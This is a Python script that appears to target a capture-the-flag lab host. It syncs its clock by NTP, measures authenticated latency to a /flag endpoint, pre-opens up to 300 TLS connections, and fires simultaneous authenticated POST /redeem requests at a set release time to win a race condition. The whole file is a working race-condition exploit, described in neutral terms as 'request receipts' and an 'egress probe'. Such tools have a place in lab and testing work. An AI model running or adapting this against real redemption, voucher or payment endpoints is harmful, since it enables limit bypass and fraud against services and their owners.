#!/usr/bin/env python3
"""Time-aligned HTTP request receipts for an authorized test endpoint.

The credential comes only from the process environment; it is never printed.
"""
import concurrent.futures as cf
import http.client
import json
import os
import socket
import ssl
import struct
import statistics
import sys
import time
import urllib.request


def ntp_offset():
    samples = []
    for host in ("time.cloudflare.com", "time.google.com", "pool.ntp.org"):
        for _ in range(3):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(1.5)
                t0 = time.time()
                s.sendto(b"\x1b" + 47*b"\0", (host, 123))
                data, _ = s.recvfrom(48)
                t1 = time.time()
                s.close()
                remote = (struct.unpack("!I", data[40:44])[0]-2208988800
                          + struct.unpack("!I", data[44:48])[0]/2**32)
                samples.append((t1-t0, remote-(t0+t1)/2, host))
            except Exception:
                pass
    if not samples:
        return 0.0, "system-clock-no-ntp", None
    rtt, offset, host = min(samples)
    return offset, host, rtt


def wait_until(utc, offset):
    while True:
        left = utc - (time.time()+offset)
        if left <= 0:
            return
        time.sleep(min(max(left/2, 0.0002), 0.2))


def preflight_rtt(host, cookie):
    """Time dynamic, authenticated reads on a reused HTTP connection."""
    conn = http.client.HTTPSConnection(host, 443, timeout=10)
    samples = []
    statuses = {}
    try:
        for i in range(9):
            t0 = time.monotonic()
            try:
                conn.request("GET", f"/flag?preflight={i}-{int(time.time()*1000)}",
                             headers={"Cookie":f"session={cookie}","Cache-Control":"no-store"})
                response = conn.getresponse()
                response.read()
                elapsed = (time.monotonic()-t0)*1000
                statuses[str(response.status)] = statuses.get(str(response.status),0)+1
                if response.status == 403:
                    samples.append(elapsed)
            except Exception:
                try: conn.close()
                except Exception: pass
                conn = http.client.HTTPSConnection(host,443,timeout=10)
    finally:
        conn.close()
    return min(samples) if samples else None, statistics.median(samples) if samples else None, statuses


def main():
    host = os.environ["LAB_HOST"]
    cookie = os.environ["LAB_COOKIE"]
    release_at = float(os.environ["RELEASE_AT"])
    count = int(os.environ.get("REQUEST_COUNT", "100"))
    worker_id = os.environ.get("WORKER_ID", "local")
    if not host.endswith(".pwnbox-lab.com") or "/" in host:
        raise ValueError("Unexpected lab hostname")
    if not (1 <= count <= 300):
        raise ValueError("REQUEST_COUNT must be 1..300")

    try:
        egress_ip = urllib.request.urlopen("https://api.ipify.org", timeout=8).read().decode().strip()
    except Exception:
        egress_ip = "unavailable"
    offset, ntp_server, ntp_rtt = ntp_offset()
    print(json.dumps({"worker":worker_id,"egress_ip":egress_ip,
          "ntp_server":ntp_server,"ntp_offset_ms":round(offset*1000,2),
          "ntp_rtt_ms":round(ntp_rtt*1000,2) if ntp_rtt is not None else None,
          "seconds_to_release":round(release_at-time.time()-offset,2)}),flush=True)

    rtt_min, rtt_median, preflight_statuses = preflight_rtt(host,cookie)
    if rtt_min is None:
        print(json.dumps({"worker":worker_id,"error":"no-403-preflight",
                          "preflight_statuses":preflight_statuses}),flush=True)
        return
    # The shared timestamp estimates origin arrival. Equalizing half of the
    # minimum dynamic round trip is a rough path-delay control, not an oracle.
    send_target = release_at - rtt_min/2000
    print(json.dumps({"worker":worker_id,"preflight_statuses":preflight_statuses,
          "rtt_min_ms":round(rtt_min,2),"rtt_median_ms":round(rtt_median,2),
          "send_advance_ms":round((release_at-send_target)*1000,2)}),flush=True)

    wait_until(send_target-5.0, offset)
    ctx = ssl.create_default_context()
    def connect_one(i):
        try:
            raw = socket.create_connection((host,443),timeout=8)
            tls = ctx.wrap_socket(raw,server_hostname=host)
            return i,tls,time.time()+offset,None
        except Exception as exc:
            return i,None,time.time()+offset,type(exc).__name__
    with cf.ThreadPoolExecutor(max_workers=count) as executor:
        staged = sorted(executor.map(connect_one, range(count)))
    live = [(i,s,t) for i,s,t,e in staged if s is not None]
    errors = {}
    for i,s,t,e in staged:
        if e: errors[e]=errors.get(e,0)+1
    ready_at = time.time()+offset
    print(json.dumps({"worker":worker_id,"ready":len(live),
          "connect_errors":errors,"ready_lead_ms":round((send_target-ready_at)*1000,1)}),flush=True)
    if ready_at >= send_target:
        print(json.dumps({"worker":worker_id,"error":"missed-release"}),flush=True)
        for _,s,_ in live: s.close()
        return

    request = (f"POST /redeem HTTP/1.1\r\nHost: {host}\r\n"
               "User-Agent: authorized-lab-egress-probe/1\r\n"
               f"Cookie: session={cookie}\r\nContent-Length: 0\r\n"
               "Accept: */*\r\nConnection: close\r\n\r\n").encode()
    wait_until(send_target, offset)
    start = time.time()+offset
    sends = []
    for i,s,t in live:
        try:
            s.sendall(request)
            sends.append((i,s,t,True))
        except Exception:
            sends.append((i,s,t,False))
    send_end=time.time()+offset

    def collect(item):
        i,s,t,sent=item
        try:
            s.settimeout(40)
            first=s.recv(8192)
            observed=time.time()+offset
            if not first: return "eof",round((observed-release_at)*1000,1)
            line=first.split(b"\r\n",1)[0].split(b" ")
            return (str(int(line[1])) if len(line)>1 else "bad-http",
                    round((observed-release_at)*1000,1))
        except Exception as exc:
            return type(exc).__name__,None
        finally:
            s.close()
    with cf.ThreadPoolExecutor(max_workers=max(1,count)) as executor:
        result=list(executor.map(collect,sends))
    counts={}
    for status,elapsed in result:counts[status]=counts.get(status,0)+1
    first_bytes={}
    for status in counts:
        times=[t for s,t in result if s==status and t is not None]
        if times: first_bytes[status]={"min_ms":min(times),"median_ms":round(statistics.median(times),1),"max_ms":max(times)}
    print(json.dumps({"worker":worker_id,"egress_ip":egress_ip,
          "release_error_ms":round((start-release_at)*1000,2),
          "send_target_error_ms":round((start-send_target)*1000,2),
          "send_span_ms":round((send_end-start)*1000,2),
          "oldest_socket_age_ms":round((start-min((x[2] for x in live),default=start))*1000,2),
          "send_ok":sum(x[3] for x in sends),"counts":counts,"first_bytes":first_bytes}),flush=True)


if __name__=="__main__":
    main()
